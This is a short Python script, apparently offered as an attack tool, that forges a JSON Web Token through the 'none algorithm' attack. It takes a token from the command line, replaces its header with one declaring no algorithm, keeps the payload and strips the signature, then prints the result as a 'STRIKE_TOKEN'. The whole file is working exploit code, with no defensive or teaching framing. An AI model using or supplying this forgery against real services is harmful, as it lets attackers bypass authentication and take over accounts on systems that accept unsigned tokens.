import sys, base64

def crack_jwt(token):
    print("[🔐] Analyzing JWT Token for Vulnerabilities...")
    try:
        header, payload, sig = token.split('.')
        # Real world 'None' algorithm attack
        new_header = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().strip("=")
        return f"STRIKE_TOKEN (None Alg): {new_header}.{payload}."
    except:
        return "Invalid Token Format."

if __name__ == "__main__":
    if len(sys.argv) > 1: print(crack_jwt(sys.argv[1]))
